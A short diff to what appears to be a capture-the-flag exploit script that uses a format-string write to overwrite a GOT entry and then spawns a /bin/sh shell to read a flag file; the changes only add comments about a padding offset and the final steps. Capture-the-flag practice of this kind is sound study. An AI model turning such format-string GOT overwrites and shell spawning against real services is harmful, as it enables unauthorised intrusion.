@@ -31,7 +31,9 @@ recvuntil(':', s)
 
 RELOOP_ADDR = 0x004009bd
 GOT_EXIT_ADDR = 0x601258
-#Value we want to write to the GOT address - 1014
+#Value we want to write to the GOT address - 1014 + 15
+#Not exactly sure why the extra +15, seems to be a glitch
+#See line 80 for further detail
 FIRST_GOT_PAD = '4195798'
 x = ''
 x += '%' + FIRST_GOT_PAD + 'x'
@@ -101,3 +103,4 @@ s.send('p /bin/sh\n')
 
 #We have shell
 s.interactive()
+#Then a simple ls -> cat flag.txt gives us the flag
